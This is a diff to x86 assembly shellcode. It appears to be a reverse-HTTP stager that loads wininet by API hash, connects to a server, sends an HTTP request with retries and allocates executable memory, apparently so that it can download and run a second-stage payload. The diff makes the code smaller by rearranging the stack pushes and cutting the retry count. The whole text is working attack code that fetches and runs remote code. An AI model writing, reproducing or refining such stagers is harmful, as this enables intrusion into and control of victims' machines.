@@ -35,20 +35,27 @@ load_wininet:
   push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
   call ebp               ; LoadLibraryA( "wininet" )
 
-  xor ebx,ebx
+set_retry:
+  push byte 8           ; retry 8 times should be enough
+  pop edi
+  xor ebx, ebx           ; push 8 zeros ([1]-[8])
+  mov ecx, edi
+push_zeros:
+  push ebx
+  loop push_zeros
 
 internetopen:
-  push ebx               ; DWORD dwFlags
-  push ebx               ; LPCTSTR lpszProxyBypass (NULL)
-  push ebx               ; LPCTSTR lpszProxyName (NULL)
-  push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
-  push ebx               ; LPCTSTR lpszAgent (NULL)
+                         ; DWORD dwFlags [1]
+                         ; LPCTSTR lpszProxyBypass (NULL) [2]
+                         ; LPCTSTR lpszProxyName (NULL) [3]
+                         ; DWORD dwAccessType (PRECONFIG = 0) [4]
+                         ; LPCTSTR lpszAgent (NULL) [5]
   push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
   call ebp
 
 internetconnect:
-  push ebx               ; DWORD_PTR dwContext (NULL)
-  push ebx               ; dwFlags
+                         ; DWORD_PTR dwContext (NULL) [6]
+                         ; dwFlags [7]
   push byte 3            ; DWORD dwService (INTERNET_SERVICE_HTTP)
   push ebx               ; password (NULL)
   push ebx               ; username (NULL)
@@ -60,22 +67,20 @@ got_server_host:
   call ebp
 
 httpopenrequest:
-  push ebx               ; dwContext (NULL)
+                         ; dwContext (NULL) [8]
   push HTTP_OPEN_FLAGS   ; dwFlags
   push ebx               ; accept types
   push ebx               ; referrer
   push ebx               ; version
-  jmp get_server_uri     ; push pointer to url
+  call got_server_uri
+server_uri:
+  db "/12345", 0x00
 got_server_uri:
   push ebx               ; method
   push eax               ; hConnection
   push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
   call ebp
   xchg esi, eax          ; save hHttpRequest in esi
-
-set_retry:
-  push byte 0x10
-  pop edi
 
 send_request:
 
@@ -122,12 +127,6 @@ failure:
 
 dbl_get_server_host:
   jmp get_server_host
-
-get_server_uri:
-  call got_server_uri
-
-server_uri:
- db "/12345", 0x00
 
 allocate_memory:
   push byte 0x40         ; PAGE_EXECUTE_READWRITE
